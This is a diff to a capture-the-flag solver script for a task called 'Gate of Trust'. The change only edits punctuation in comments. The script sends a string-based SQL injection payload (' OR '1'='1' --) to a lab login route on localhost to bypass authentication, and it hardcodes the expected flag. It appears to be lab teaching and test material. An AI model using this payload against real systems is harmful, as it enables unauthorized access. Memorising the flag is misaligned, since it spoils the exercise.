@@ -1,17 +1,17 @@
 #!/usr/bin/env bash
-# solvers/p1_1.sh — Task 1.1 "Gate of Trust" canonical exploit.
+# solvers/p1_1.sh, Task 1.1 "Gate of Trust" canonical exploit.
 #
 # The login route builds its query with raw string concatenation:
 #   SELECT * FROM applicants WHERE username='{u}' AND password='{p}'
 # Closing the username string and appending an always-true OR clause lets
 # any password authenticate as the first row MariaDB returns (the admin
-# row, since it's id=1) — a classic string-based SQLi auth bypass.
+# row, since it's id=1), a classic string-based SQLi auth bypass.
 set -uo pipefail
 
 BASE="${SEIYAKU_BASE:-http://localhost:8000}"
 FLAG="SEIYAKU{the_vow_was_never_sealed}"
 
-echo "[p1_1] POST ${BASE}/p1/gate — auth-bypass payload"
+echo "[p1_1] POST ${BASE}/p1/gate, auth-bypass payload"
 resp=$(curl -s -X POST "${BASE}/p1/gate" \
     --data-urlencode "username=' OR '1'='1' -- " \
     --data-urlencode "password=whatever")
